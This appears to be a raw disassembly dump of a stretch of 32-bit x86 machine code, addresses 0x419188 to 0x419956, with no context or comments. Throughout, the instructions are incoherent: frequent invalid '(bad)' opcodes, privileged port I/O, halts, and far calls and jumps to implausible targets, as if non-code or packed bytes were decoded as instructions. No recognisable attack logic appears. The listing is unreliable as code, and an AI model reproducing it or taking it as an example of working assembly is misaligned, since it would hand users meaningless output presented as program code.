  419188:	jecxz  0x41913a
  41918a:	adc    BYTE PTR [eax+0x4c],ah
  41918d:	jp     0x4191de
  41918f:	jecxz  0x419182
  419191:	inc    edi
  419192:	rdtsc  
  419194:	es inc esi
  419196:	dec    esp
  419197:	sub    DWORD PTR [eax+edi*8-0x14],eax
  41919b:	xchg   edx,eax
  41919c:	mov    WORD PTR [eax],ds
  41919e:	test   edi,edx
  4191a0:	retf   0xbc15
  4191a3:	clc    
  4191a4:	push   0xf798b729
  4191a9:	mov    ebx,ebp
  4191ab:	arpl   WORD PTR [eax+0x61fb0a70],bx
  4191b1:	(bad)  
  4191b3:	lock xchg ecx,eax
  4191b5:	(bad)  
  4191b6:	push   ds
  4191b7:	aam    0xc7
  4191b9:	sub    eax,0x696389fd
  4191be:	push   ds
  4191bf:	outs   dx,DWORD PTR ds:[esi]
  4191c0:	retf   0xba5
  4191c3:	mov    BYTE PTR [ecx+ebp*1],bh
  4191c6:	imul   DWORD PTR [eiz*2-0x79808b4]
  4191cd:	push   cs
  4191ce:	push   esp
  4191cf:	in     al,0xd0
  4191d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4191d2:	cmp    eax,0x50c77df2
  4191d7:	mov    eax,0x70e6c6f5
  4191dc:	add    BYTE PTR [esi-0x11],al
  4191df:	hlt    
  4191e0:	in     al,0xb2
  4191e2:	fs pop ds
  4191e4:	sub    BYTE PTR [ebp+esi*8-0x1e],al
  4191e8:	and    edx,ecx
  4191ea:	mov    al,0xeb
  4191ec:	repz call 0x55fd:0xf6ef6530
  4191f4:	xchg   edi,eax
  4191f5:	or     edx,ebp
  4191f7:	dec    edi
  4191f8:	stos   DWORD PTR es:[edi],eax
  4191f9:	retf   
  4191fa:	out    0x8c,al
  4191fc:	es adc ebx,esi
  4191ff:	daa    
  419200:	sbb    eax,0xf0fa933a
  419205:	xchg   ebp,eax
  419206:	fdivr  st,st(6)
  419208:	xor    DWORD PTR [edi+0x63b731fa],edi
  41920e:	jo     0x419195
  419210:	cmc    
  419211:	adc    esi,DWORD PTR [edi+0x56]
  419214:	cmp    DWORD PTR [esi],ebp
  419216:	out    0x67,al
  419218:	push   ebx
  419219:	mov    bl,0x60
  41921b:	mov    dl,0x8f
  41921d:	dec    ebx
  41921e:	repnz (bad) 
  419220:	test   BYTE PTR [esi-0x56],0x9d
  419224:	not    DWORD PTR ds:[ecx+0x64365022]
  41922b:	inc    edi
  41922c:	fwait
  41922d:	loope  0x41924c
  41922f:	cmp    ecx,edi
  419231:	pop    edi
  419232:	retf   0xfbbe
  419235:	je     0x419278
  419237:	pop    esp
  419238:	add    DWORD PTR [esi-0x17],eax
  41923b:	mov    esp,0xbec26b8b
  419240:	aad    0xf8
  419242:	aas    
  419243:	in     eax,0xbd
  419245:	or     dh,BYTE PTR [ebx+0xa0ec961]
  41924b:	mov    DWORD PTR [ebp+0x3c],ebp
  41924e:	pop    ecx
  41924f:	addr16 ja 0x419260
  419252:	mov    ebx,0x373bb8fe
  419257:	push   0xdc67dffb
  41925c:	bound  ecx,QWORD PTR ds:0xa2ef9611
  419262:	push   edi
  419263:	xchg   esp,eax
  419264:	lds    esi,FWORD PTR [edi-0xb]
  419267:	aad    0x32
  419269:	mov    eax,ds:0x7b9dc70
  41926e:	out    dx,al
  41926f:	mov    ecx,0xd68be8f3
  419274:	jbe    0x41929f
  419276:	mov    al,0x1c
  419278:	xor    BYTE PTR [edi-0x3c058bd2],bl
  41927e:	call   0xde99287a
  419283:	cmp    al,0x36
  419285:	mov    ds:0x348a50bb,al
  41928a:	div    DWORD PTR [esi+0x633e59b0]
  419290:	arpl   WORD PTR [ecx-0x364e1bbe],cx
  419296:	add    eax,0x37ee5a4
  41929b:	test   BYTE PTR [ecx-0xd],dl
  41929e:	in     al,0xd7
  4192a0:	mov    esi,edi
  4192a2:	mov    ?,WORD PTR [edx]
  4192a4:	ffree  st(7)
  4192a6:	dec    edi
  4192a7:	pop    ds
  4192a8:	cmc    
  4192a9:	les    ebx,FWORD PTR [edi]
  4192ab:	inc    ebp
  4192ac:	ret    0xdf8f
  4192af:	enter  0xc4fb,0x2e
  4192b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192b4:	xchg   ebx,eax
  4192b5:	add    DWORD PTR [edx-0x69e89712],esp
  4192bb:	jno    0x4192f1
  4192bd:	push   eax
  4192be:	scas   al,BYTE PTR es:[edi]
  4192bf:	iret   
  4192c0:	in     al,0x46
  4192c2:	and    ah,dl
  4192c4:	jb     0x419261
  4192c6:	xchg   ebx,eax
  4192c7:	add    BYTE PTR [ebx+0x7fa9f3d9],dh
  4192cd:	xchg   BYTE PTR [edi],dl
  4192cf:	in     eax,0x69
  4192d1:	cdq    
  4192d2:	inc    edi
  4192d3:	mov    edx,esp
  4192d5:	inc    esp
  4192d6:	fwait
  4192d7:	cmp    bl,bl
  4192d9:	push   esi
  4192da:	out    0x63,eax
  4192dc:	dec    edx
  4192dd:	add    al,0x8b
  4192df:	retf   0x7d6
  4192e2:	test   DWORD PTR [edi+0x31e5ab85],edx
  4192e8:	test   eax,0xa8038a7f
  4192ed:	mov    al,ds:0x47b89ff0
  4192f2:	(bad)  
  4192f3:	jo     0x4192eb
  4192f5:	add    BYTE PTR [edx],bl
  4192f7:	jg     0x41928e
  4192f9:	jmp    0x7397cf3
  4192fe:	ss inc esi
  419300:	pop    es
  419301:	out    dx,eax
  419302:	cdq    
  419303:	mov    bh,0x11
  419305:	out    dx,al
  419306:	scas   eax,DWORD PTR es:[edi]
  419307:	stos   BYTE PTR es:[edi],al
  419308:	dec    edx
  419309:	gs test eax,0x5665b0c2
  41930f:	cmp    eax,0x1bdc5028
  419314:	mov    dl,BYTE PTR [edx-0x9e10740]
  41931a:	mov    eax,0xb7562037
  41931f:	cmp    DWORD PTR [ecx-0x3c644742],ecx
  419325:	mov    esi,0xd0bec064
  41932a:	ss push ebp
  41932c:	mov    al,0xa5
  41932e:	sub    edi,ebx
  419330:	imul   ebp,ebp,0x2f
  419333:	in     al,0x5b
  419335:	cld    
  419336:	popa   
  419337:	add    bl,ah
  419339:	imul   ebp,DWORD PTR [esi-0x4c0e4ee6],0x13d9aa41
  419343:	icebp  
  419344:	mov    bh,dl
  419346:	sti    
  419347:	fs fcmovnb st,st(2)
  41934a:	repnz pushf 
  41934c:	cmp    al,0x13
  41934e:	stos   DWORD PTR es:[edi],eax
  41934f:	sbb    eax,0xb0e686c9
  419354:	cmp    DWORD PTR [ebx-0x3],esi
  419357:	push   0xcb80a7f3
  41935c:	inc    eax
  41935d:	inc    ebp
  41935e:	cmp    DWORD PTR [ebx],eax
  419360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419361:	call   FWORD PTR [eax+0x4a]
  419364:	dec    edx
  419365:	and    ch,BYTE PTR [edx+eiz*2-0x119ae341]
  41936c:	or     eax,0x4e3a8f22
  419371:	inc    ecx
  419372:	add    BYTE PTR [edi-0x3f],bh
  419375:	push   esi
  419376:	lsl    edx,WORD PTR [ecx+0x71]
  41937a:	and    edx,DWORD PTR [edi+ecx*8+0x3]
  41937e:	into   
  41937f:	icebp  
  419380:	push   eax
  419381:	cmp    al,0x8d
  419383:	ins    DWORD PTR es:[edi],dx
  419384:	xchg   esi,eax
  419385:	data16 jae 0x4193ed
  419388:	sub    al,0xfe
  41938a:	xchg   edi,eax
  41938b:	sbb    al,0xf1
  41938d:	sub    edx,DWORD PTR [edx-0x29]
  419390:	call   0xfee5c609
  419395:	popf   
  419396:	call   0x3459:0x5059a1ce
  41939d:	leave  
  41939e:	nop
  41939f:	loop   0x41938a
  4193a1:	hlt    
  4193a2:	cld    
  4193a3:	mov    DWORD PTR [eax-0x7226f9ed],ecx
  4193a9:	push   eax
  4193aa:	mov    eax,cs:0xcfb05200
  4193b0:	loop   0x41942f
  4193b2:	idiv   DWORD PTR [esi+0x2170cb7f]
  4193b8:	mov    edi,0xbd9fb6c9
  4193bd:	jne    0x4193c9
  4193bf:	pushf  
  4193c0:	daa    
  4193c1:	push   ebp
  4193c2:	pusha  
  4193c3:	ss dec ebx
  4193c5:	add    ecx,DWORD PTR [edx-0x1c]
  4193c8:	loopne 0x41942e
  4193ca:	jecxz  0x4193df
  4193cc:	fstp   TBYTE PTR [eax+0x10]
  4193cf:	dec    ebp
  4193d0:	in     eax,0x2a
  4193d2:	mov    dl,0xf2
  4193d4:	or     BYTE PTR [ebx+0x47],al
  4193d7:	mov    ch,0xdb
  4193d9:	mov    al,0xd7
  4193db:	ins    BYTE PTR es:[edi],dx
  4193dc:	add    eax,0x7278bde6
  4193e1:	xor    eax,DWORD PTR [ebx]
  4193e3:	push   esi
  4193e4:	jbe    0x419436
  4193e6:	loop   0x419457
  4193e8:	or     ebp,DWORD PTR [edx+0x23902cd3]
  4193ee:	gs addr16 enter 0xb79a,0x1a
  4193f4:	int    0x9b
  4193f6:	call   0xb661bc58
  4193fb:	nop
  4193fc:	pop    ecx
  4193fd:	cmp    esi,DWORD PTR [esi-0x49b1bb90]
  419403:	xchg   edi,eax
  419404:	xor    DWORD PTR [ecx-0x34],esi
  419407:	rcr    BYTE PTR [ebx],0x86
  41940a:	jmp    0x4193df
  41940c:	xor    DWORD PTR [ebx],0x1e
  41940f:	dec    ecx
  419410:	(bad)  
  419411:	call   0xe81b8f88
  419416:	in     al,0x28
  419418:	icebp  
  419419:	iret   
  41941a:	es mov esp,0x1f518ba6
  419420:	mov    ?,edi
  419422:	xlat   BYTE PTR ds:[ebx]
  419423:	stc    
  419424:	adc    edi,ebp
  419426:	sar    BYTE PTR [ecx+0x14],cl
  419429:	sub    al,0xcc
  41942b:	pusha  
  41942c:	lahf   
  41942d:	jg     0x41946b
  41942f:	add    dl,BYTE PTR ds:0x509baffd
  419435:	sub    eax,0xc4f90b78
  41943a:	fld    DWORD PTR [ebp-0x40]
  41943d:	shl    DWORD PTR [esi-0x57],1
  419440:	push   0x7344b602
  419445:	mov    al,0x43
  419447:	gs ss mov ah,0xc6
  41944b:	aam    0x14
  41944d:	lds    edx,FWORD PTR [ecx]
  41944f:	aaa    
  419450:	ret    
  419451:	iret   
  419452:	ja     0x419415
  419454:	adc    ebx,DWORD PTR ds:0x8e5f991d
  41945a:	push   ebp
  41945b:	shl    DWORD PTR [ebp+0x2],0xb
  41945f:	xchg   ebx,eax
  419460:	jo     0x4194a7
  419462:	imul   edi,DWORD PTR [esi-0x5e],0x1d
  419466:	sub    esi,DWORD PTR [ebx]
  419468:	pop    esp
  419469:	jno    0x419476
  41946b:	imul   esp,DWORD PTR [ebx+0x39],0x2
  41946f:	retf   0x5c00
  419472:	inc    ebx
  419473:	fsubr  QWORD PTR [edx-0x37]
  419476:	and    ah,ah
  419478:	inc    esp
  419479:	mov    BYTE PTR [esi+0x40c8c079],bh
  41947f:	mov    edx,0x1338b2c4
  419484:	iret   
  419485:	mov    ch,0x3f
  419487:	test   DWORD PTR [esp+ecx*8+0x6b0d1171],esp
  41948e:	mov    dl,0x98
  419490:	dec    eax
  419491:	mov    ch,0x5b
  419493:	sub    al,0x47
  419495:	je     0x4194d3
  419497:	pop    edi
  419498:	div    BYTE PTR [esi-0x2a4c0d31]
  41949e:	js     0x4194a3
  4194a0:	dec    esi
  4194a1:	test   BYTE PTR [edi],al
  4194a3:	loopne 0x41949b
  4194a5:	(bad)  
  4194a6:	enter  0x1066,0xf5
  4194aa:	push   0xd8eef977
  4194af:	mov    eax,ds:0x33e0b88c
  4194b4:	cli    
  4194b5:	push   0xffffffd2
  4194b7:	push   ecx
  4194b8:	sub    esi,DWORD PTR [ebx]
  4194ba:	(bad)  [ecx]
  4194bc:	int    0xd0
  4194be:	dec    esi
  4194bf:	in     eax,dx
  4194c0:	test   eax,0xa8faf114
  4194c5:	aaa    
  4194c6:	imul   ecx,DWORD PTR [ecx+0x5b],0x3ce3ef6a
  4194cd:	daa    
  4194ce:	std    
  4194cf:	sbb    eax,0x3c4eb26
  4194d4:	xchg   ebx,eax
  4194d5:	aad    0xf2
  4194d7:	mov    ds:0x7aa1f89b,eax
  4194dc:	and    ch,dl
  4194de:	leave  
  4194df:	inc    esp
  4194e0:	gs jecxz 0x4194f0
  4194e3:	xchg   edi,eax
  4194e4:	mov    ebx,0xedf9b362
  4194e9:	pop    ebx
  4194ea:	jge    0x419524
  4194ec:	add    dl,dl
  4194ee:	cdq    
  4194ef:	ret    0x18dc
  4194f2:	mov    dh,0x5
  4194f4:	stos   BYTE PTR es:[edi],al
  4194f5:	adc    eax,0xe96ee19
  4194fa:	or     al,bl
  4194fc:	xlat   BYTE PTR ds:[ebx]
  4194fd:	(bad)  
  419500:	dec    edx
  419501:	lods   eax,DWORD PTR ds:[esi]
  419502:	cmp    BYTE PTR [ebx+ebp*8],bh
  419505:	or     ecx,DWORD PTR [eax]
  419507:	xchg   ebx,eax
  419508:	inc    ebp
  419509:	xchg   edx,eax
  41950a:	and    BYTE PTR [edi-0x4fce9664],0x1e
  419511:	mov    al,0xb6
  419513:	push   ds
  419514:	in     eax,0x5e
  419516:	inc    ebp
  419517:	sti    
  419518:	or     cl,BYTE PTR [ebp+eiz*4+0x7a]
  41951c:	(bad)  
  41951d:	out    dx,eax
  41951e:	cmp    eax,0xbbd9a3a3
  419523:	adc    eax,esp
  419525:	es push 0xa8207665
  41952b:	sub    bl,cl
  41952d:	aas    
  41952e:	xchg   ebx,eax
  41952f:	cmp    bh,al
  419531:	dec    esp
  419532:	sub    edx,esi
  419534:	inc    edx
  419535:	icebp  
  419536:	(bad)  
  419538:	sbb    BYTE PTR [esi-0x4f319dcb],bl
  41953e:	js     0x4195af
  419540:	sub    ebx,ecx
  419542:	pop    esp
  419543:	cwde   
  419544:	push   cs
  419545:	jge    0x4194f2
  419547:	ja     0x41959d
  419549:	mov    ah,0x41
  41954b:	imul   ebx,DWORD PTR [ecx],0x32
  41954e:	js     0x419559
  419550:	jl     0x419568
  419552:	sub    esi,DWORD PTR [ebx]
  419554:	sbb    eax,ecx
  419556:	mov    ch,0xf4
  419558:	repnz sbb al,0xc1
  41955b:	in     al,dx
  41955c:	inc    edx
  41955d:	ins    DWORD PTR es:[edi],dx
  41955e:	adc    esp,DWORD PTR [edx-0x3e89aad4]
  419564:	cmp    BYTE PTR [ecx+0xe20311],dh
  41956a:	mov    BYTE PTR [esi+0x5c],bl
  41956d:	mov    ebx,0xe448c22b
  419572:	add    ch,bh
  419574:	es sahf 
  419576:	ficom  WORD PTR ds:0xf37b2113
  41957c:	xor    ebx,DWORD PTR [ecx]
  41957e:	xchg   esp,eax
  41957f:	sub    BYTE PTR [edx],ch
  419581:	aaa    
  419582:	mov    esp,0xc23b3084
  419587:	and    dl,bl
  419589:	inc    edi
  41958a:	sub    DWORD PTR [ebp-0x7d],0x131f9fc4
  419591:	adc    dh,0x8c
  419594:	fisttp WORD PTR [esi]
  419596:	ror    BYTE PTR [ecx-0x27],1
  419599:	repnz cwde 
  41959b:	outs   dx,DWORD PTR ds:[esi]
  41959c:	xor    esi,DWORD PTR [esi-0x1c7954e6]
  4195a2:	mov    ds:0x65451948,eax
  4195a7:	pushaw 
  4195a9:	jb     0x4195eb
  4195ab:	mov    ebx,0x3ac8d5f7
  4195b0:	xchg   edx,eax
  4195b1:	aam    0xc8
  4195b3:	push   ds
  4195b4:	(bad)  
  4195b5:	push   es
  4195b6:	sti    
  4195b7:	cdq    
  4195b8:	sub    bl,BYTE PTR [ebx+0x6]
  4195bb:	push   esi
  4195bc:	outs   dx,BYTE PTR ds:[esi]
  4195bd:	mov    dl,0x92
  4195bf:	push   eax
  4195c0:	rcr    BYTE PTR [eax],0xe5
  4195c3:	scas   al,BYTE PTR es:[edi]
  4195c4:	push   ebx
  4195c5:	add    DWORD PTR [ebx-0x1a],edx
  4195c8:	and    ebp,DWORD PTR [esi-0x2]
  4195cb:	cld    
  4195cc:	cmp    esp,ebp
  4195ce:	loop   0x4195ec
  4195d0:	jmp    0x4195aa
  4195d2:	xchg   esi,eax
  4195d3:	enter  0x7395,0xfb
  4195d7:	xor    eax,0x1ac9010c
  4195dc:	xchg   ebx,eax
  4195dd:	mov    al,BYTE PTR [eax+0xa6b2651]
  4195e3:	pop    esp
  4195e4:	in     eax,0x7b
  4195e6:	add    BYTE PTR [eax-0x29],bh
  4195e9:	inc    ecx
  4195ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195eb:	adc    al,0x4
  4195ed:	dec    ebp
  4195ee:	int3   
  4195ef:	add    ebp,DWORD PTR [ecx+0x1966ca5a]
  4195f5:	aam    0xf7
  4195f7:	xchg   esi,eax
  4195f8:	mov    esi,0x6bfd48a9
  4195fd:	mov    esi,ebx
  4195ff:	in     eax,0x61
  419601:	lods   al,BYTE PTR ds:[esi]
  419602:	sub    ecx,DWORD PTR [eax+0x32604835]
  419608:	lds    esi,FWORD PTR [ebx+0x66]
  41960b:	adc    eax,0xa12cfe14
  419610:	inc    esp
  419611:	adc    DWORD PTR [eax*2-0x3e3aef56],esi
  419618:	cmp    al,bl
  41961a:	mov    ch,0x56
  41961c:	sbb    ch,BYTE PTR [edx-0x723ebf4b]
  419622:	jns    0x41968c
  419624:	jl     0x4196a0
  419626:	adc    bh,BYTE PTR [esi+edi*1+0x3b79828f]
  41962d:	ret    
  41962e:	js     0x41967c
  419630:	in     eax,dx
  419631:	xor    bh,0x5b
  419634:	popa   
  419635:	int3   
  419636:	and    al,0x57
  419638:	inc    ebx
  419639:	push   si
  41963b:	sbb    DWORD PTR ds:[ebx],edx
  41963e:	adc    BYTE PTR ds:0xc35f0d4c,ch
  419644:	retf   0x149
  419647:	fisubr WORD PTR [eax-0x91d6fe9]
  41964d:	jnp    0x4196b2
  41964f:	pop    eax
  419650:	stos   BYTE PTR es:[edi],al
  419651:	sbb    cl,BYTE PTR [eax-0x2ca75138]
  419657:	repz push esp
  419659:	(bad)  
  41965a:	mov    esi,0x4564ba8b
  41965f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419660:	ret    0x5ca4
  419663:	dec    esi
  419664:	das    
  419665:	push   0x9a93bea1
  41966a:	inc    ebp
  41966b:	lock popf 
  41966d:	arpl   dx,sp
  41966f:	lods   al,BYTE PTR ds:[esi]
  419670:	cmp    ebx,edi
  419672:	dec    esp
  419673:	rol    DWORD PTR [ebp+0x6a1cea44],1
  419679:	sub    al,0xa7
  41967b:	in     eax,dx
  41967c:	mov    dh,0xdf
  41967e:	mov    ?,WORD PTR [ebp-0x4c01c310]
  419684:	xor    DWORD PTR [ebx],esi
  419686:	cwde   
  419687:	sbb    al,0x8f
  419689:	imul   edi,DWORD PTR [edi+0x2],0x513925a0
  419690:	(bad)  
  419691:	push   ss
  419692:	cmc    
  419693:	ins    BYTE PTR es:[edi],dx
  419694:	nop
  419695:	dec    ebp
  419696:	in     eax,0x79
  419698:	mov    ecx,0x7e0c1740
  41969d:	(bad)  
  41969e:	jmp    0x41971a
  4196a0:	int    0x1c
  4196a2:	data16 mov dh,ah
  4196a5:	out    0x96,eax
  4196a7:	adc    ax,0xc3c5
  4196ab:	icebp  
  4196ac:	in     eax,dx
  4196ad:	mov    ds:0x3b24c8fe,al
  4196b2:	sbb    eax,DWORD PTR [ebp-0x3e]
  4196b5:	loope  0x41969c
  4196b7:	jg     0x41972a
  4196b9:	aam    0x4d
  4196bb:	into   
  4196bc:	das    
  4196bd:	xor    BYTE PTR [ecx-0x5a],ah
  4196c0:	cmp    edx,esp
  4196c2:	outs   dx,DWORD PTR ds:[esi]
  4196c3:	mov    cl,0x52
  4196c5:	xor    DWORD PTR [edi-0x21060cc2],eax
  4196cb:	cmp    ecx,ebx
  4196cd:	xor    ecx,DWORD PTR [esi]
  4196cf:	add    DWORD PTR [edi+0x57ae9403],0x1977ebab
  4196d9:	scas   eax,DWORD PTR es:[edi]
  4196da:	addr16 inc esi
  4196dc:	add    BYTE PTR [edx-0x448b6ee],al
  4196e2:	cwde   
  4196e3:	test   cx,bx
  4196e6:	sahf   
  4196e7:	jp     0x41967d
  4196e9:	loop   0x419718
  4196eb:	xor    al,0x37
  4196ed:	add    bh,BYTE PTR [ecx+0x15]
  4196f0:	(bad)  
  4196f1:	(bad)  ds:0xad5ee4ea
  4196f7:	ins    BYTE PTR es:[edi],dx
  4196f8:	xor    DWORD PTR [edi],esi
  4196fa:	ret    
  4196fb:	pop    ebx
  4196fc:	mov    esp,0x85cfb3d8
  419701:	adc    eax,0x345d3711
  419706:	pop    edx
  419707:	test   DWORD PTR [eax-0x5a],ebx
  41970a:	out    0xed,eax
  41970c:	push   ebx
  41970d:	sbb    bl,BYTE PTR [ecx+0x3]
  419710:	nop
  419711:	hlt    
  419712:	fdivr  DWORD PTR [eax]
  419714:	lahf   
  419715:	adc    ah,BYTE PTR [edx]
  419717:	test   DWORD PTR [ebp-0x58],eax
  41971a:	pop    ds
  41971b:	mov    ds:0x329673b3,al
  419720:	xchg   ecx,eax
  419721:	cmp    eax,0x968d4e6a
  419726:	pusha  
  419727:	test   DWORD PTR [ebx+0x76],esi
  41972a:	out    0x28,al
  41972c:	shl    DWORD PTR [edi-0x1d],cl
  41972f:	test   al,0x1c
  419731:	aam    0x55
  419733:	sahf   
  419734:	mov    bh,0x5c
  419736:	stc    
  419737:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419738:	add    al,0x6e
  41973a:	inc    esi
  41973b:	cwde   
  41973c:	push   ebx
  41973d:	aam    0xc0
  41973f:	mov    gs,WORD PTR ds:0x52f6bbba
  419745:	enter  0x62e4,0xfe
  419749:	retf   
  41974a:	hlt    
  41974b:	popf   
  41974c:	inc    ebp
  41974d:	mov    eax,0x1a24cb55
  419752:	es xchg ebp,eax
  419754:	(bad)
  419758:	sub    eax,0xfa9749ab
  41975d:	xor    eax,0xe3c10191
  419762:	xlat   BYTE PTR ds:[ebx]
  419763:	jecxz  0x419752
  419765:	mov    edi,0x3f228903
  41976a:	xor    ah,BYTE PTR [eax-0x78c31cf0]
  419770:	dec    esi
  419771:	call   0x387f89e3
  419776:	add    al,0xef
  419778:	mov    ebp,0xfd7ac685
  41977d:	out    0x35,al
  41977f:	aas    
  419780:	jp     0x41979e
  419782:	xchg   ecx,eax
  419783:	jbe    0x41973b
  419785:	mov    DWORD PTR [eax+0x64],esp
  419788:	pushf  
  419789:	pusha  
  41978a:	or     BYTE PTR [esp+ebp*1-0x14c691e5],0xea
  419792:	ins    BYTE PTR es:[edi],dx
  419793:	and    cl,BYTE PTR [ecx+0x17210909]
  419799:	and    al,0x76
  41979b:	push   0xffffffa7
  41979d:	sbb    BYTE PTR [ecx+ebp*8],dh
  4197a0:	test   eax,0xc89c3078
  4197a5:	add    DWORD PTR [eax+esi*8+0x3],edi
  4197a9:	imul   ecx,DWORD PTR [edi],0x2162a6f0
  4197af:	es shl ch,1
  4197b2:	adc    eax,0x2f34d97
  4197b7:	xor    eax,0x314b9b3
  4197bc:	(bad)  
  4197bd:	fwait
  4197be:	push   ss
  4197bf:	xor    BYTE PTR [edi+0x68709019],ah
  4197c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4197c6:	pop    ebp
  4197c7:	mov    al,ds:0x13b570ae
  4197cc:	(bad)  
  4197cd:	and    eax,edx
  4197cf:	rcl    BYTE PTR [ebp-0x52],cl
  4197d2:	(bad)  
  4197d3:	jns    0x419784
  4197d5:	jmp    0x9e3f:0x4b9e3ca2
  4197dc:	sub    eax,0x161d63e0
  4197e1:	ror    BYTE PTR [ecx-0x574ff377],0x52
  4197e8:	xchg   DWORD PTR [ebx],ebp
  4197ea:	sbb    DWORD PTR ds:0x54c2fbba,0xece50755
  4197f4:	nop
  4197f5:	rol    DWORD PTR [ebp+0x66],0x41
  4197f9:	jb     0x419807
  4197fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4197fc:	lods   eax,DWORD PTR ds:[esi]
  4197fd:	in     al,0xaf
  4197ff:	int    0x7
  419801:	push   edi
  419802:	outs   dx,DWORD PTR ds:[esi]
  419803:	rcr    DWORD PTR [edi-0x32f8d48f],cl
  419809:	sbb    esp,DWORD PTR [eax+0x7f4a6e5a]
  41980f:	ror    BYTE PTR [eax-0xe],cl
  419812:	sub    ebp,ebx
  419814:	sar    ah,1
  419816:	adc    esp,DWORD PTR [ebp+0x14d015e6]
  41981c:	not    DWORD PTR [eax-0x37]
  41981f:	pushf  
  419820:	xor    BYTE PTR [ecx+0x69],bl
  419823:	jae    0x419825
  419825:	xchg   edi,eax
  419826:	add    dl,ch
  419828:	xor    edi,DWORD PTR [esi+0x57]
  41982b:	and    dh,0x51
  41982e:	dec    edx
  41982f:	outs   dx,BYTE PTR ds:[esi]
  419830:	iret   
  419831:	loopne 0x41984e
  419833:	adc    al,dh
  419835:	(bad)  
  419836:	cmp    esp,edi
  419838:	inc    ebx
  419839:	repnz mov esi,0x8eec0d7b
  41983f:	cwde   
  419840:	sub    al,BYTE PTR [esi-0x80]
  419843:	xchg   esi,eax
  419844:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419845:	dec    esp
  419846:	add    ah,BYTE PTR [esp+ebp*2-0x73995187]
  41984d:	push   edi
  41984e:	adc    dl,0xd1
  419851:	test   BYTE PTR [ecx],dl
  419853:	mov    esi,0x68ce3421
  419858:	mov    ebx,0xb048923e
  41985d:	xchg   ecx,eax
  41985e:	dec    ebp
  41985f:	jmp    0x41981e
  419861:	(bad)  
  419862:	pop    ecx
  419863:	nop
  419864:	in     al,0xcf
  419866:	xchg   ebp,eax
  419867:	scas   al,BYTE PTR es:[edi]
  419868:	fs adc eax,0xd35b9b81
  41986e:	push   ecx
  41986f:	adc    al,0x7d
  419871:	js     0x419898
  419873:	mov    ds:0x6073c3ad,al
  419878:	dec    ecx
  419879:	cmp    ebx,DWORD PTR [esi+edi*2+0x18]
  41987d:	sti    
  41987e:	cmp    dh,dl
  419880:	pop    ebp
  419881:	mov    cl,0x40
  419883:	pusha  
  419884:	lods   eax,DWORD PTR ds:[esi]
  419885:	gs pop ecx
  419887:	sahf   
  419888:	aas    
  419889:	in     al,0x20
  41988b:	xchg   bh,ah
  41988d:	adc    al,0xd6
  41988f:	cmc    
  419890:	(bad)  
  419891:	pop    edi
  419892:	iret   
  419893:	adc    BYTE PTR [esi],dh
  419895:	xchg   DWORD PTR [edx],esp
  419897:	mov    esp,0x1576f9e2
  41989c:	cdq    
  41989d:	add    edx,ebx
  41989f:	cmp    eax,0x4d1febfb
  4198a4:	data16 or al,0x7d
  4198a7:	dec    ebx
  4198a8:	icebp  
  4198a9:	xchg   ebp,eax
  4198aa:	ret    0x4ab8
  4198ad:	add    BYTE PTR [edi-0x1a],ch
  4198b0:	mov    esi,0x213fc720
  4198b5:	fcomp  st(3)
  4198b7:	mov    DWORD PTR [eax-0x6c],ebx
  4198ba:	jnp    0x4198aa
  4198bc:	les    ebp,FWORD PTR [edx]
  4198be:	jb     0x4198df
  4198c0:	lock xchg esi,eax
  4198c2:	lods   eax,DWORD PTR ds:[esi]
  4198c3:	xor    ah,ch
  4198c5:	fs push cs
  4198c7:	test   al,0x7c
  4198ca:	xchg   ebx,eax
  4198cb:	in     eax,0x2b
  4198cd:	lods   al,BYTE PTR ds:[esi]
  4198ce:	mov    ebp,0x2579c627
  4198d3:	dec    esi
  4198d4:	sbb    BYTE PTR [esi+0x30],0xe4
  4198d8:	pusha  
  4198d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198da:	daa    
  4198db:	stos   DWORD PTR es:[edi],eax
  4198dc:	pop    esp
  4198dd:	stos   BYTE PTR es:[edi],al
  4198de:	xchg   esi,eax
  4198df:	mov    edi,0x2afa294e
  4198e4:	sbb    DWORD PTR [edi+0x66],edx
  4198e7:	dec    ecx
  4198e8:	xchg   edi,eax
  4198e9:	or     al,0x80
  4198eb:	popf   
  4198ec:	rcr    DWORD PTR [ecx-0xe970c0e],1
  4198f2:	clc    
  4198f3:	in     eax,dx
  4198f4:	mov    dl,0xb3
  4198f6:	xchg   ecx,eax
  4198f7:	push   0xffffffcf
  4198f9:	int    0x10
  4198fb:	lea    edi,[ebp+0x4d]
  4198fe:	adc    al,0x24
  419900:	lock popf 
  419902:	dec    ecx
  419903:	ins    BYTE PTR es:[edi],dx
  419904:	rcl    DWORD PTR [esi],1
  419906:	lea    esp,[edi+ecx*1-0x37]
  41990a:	pushf  
  41990b:	dec    eax
  41990c:	hlt    
  41990d:	addr16 mov cl,0xc6
  419910:	xchg   ecx,eax
  419911:	clc    
  419912:	mov    DWORD PTR [edx],edi
  419914:	pop    ds
  419915:	pop    ecx
  419916:	leave  
  419917:	jmp    edx
  419919:	pop    esp
  41991a:	cmp    dh,BYTE PTR [ebx]
  41991c:	add    esi,DWORD PTR [eax-0x7edaab56]
  419922:	outs   dx,BYTE PTR ds:[esi]
  419923:	sbb    eax,0x274ac125
  419928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419929:	adc    DWORD PTR [edx+eax*2],edx
  41992c:	xlat   BYTE PTR ds:[ebx]
  41992d:	int    0xea
  41992f:	addr16 pop bp
  419932:	mov    ecx,0xbfd9e109
  419937:	popa   
  419938:	push   esp
  419939:	mov    ds:0x5362b30a,eax
  41993e:	cvtdq2ps xmm4,XMMWORD PTR ds:0x1ebbcc6f
  419945:	or     ch,BYTE PTR [ebx+0x61]
  419948:	imul   ebx,ebx,0xffffffe8
  41994b:	adc    edx,DWORD PTR [edx-0x14]
  41994e:	loope  0x41992f
  419950:	push   ds
  419951:	outs   dx,DWORD PTR ds:[esi]
  419952:	jne    0x41998f
  419954:	jl     0x41992b
  419956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
